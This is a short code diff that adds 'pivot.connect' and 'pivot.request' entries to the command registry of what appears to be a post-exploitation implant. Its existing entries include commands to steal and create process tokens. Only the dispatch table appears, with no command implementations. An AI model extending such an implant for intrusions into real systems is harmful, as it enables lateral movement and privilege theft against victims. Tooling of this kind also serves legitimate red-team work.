@@ -21,4 +21,6 @@ std::vector<ImplantCommand> g_CommandRegistry = {
     { "token.rev2self", CommandTokenRev2Self }, // revert token
     { "token.make", CommandTokenMake },         // create token
     { "token.steal", CommandTokenSteal },       // steal process token
+    { "pivot.connect", CommandPivotConnect },
+    { "pivot.request", CommandPivotRequest },
 };
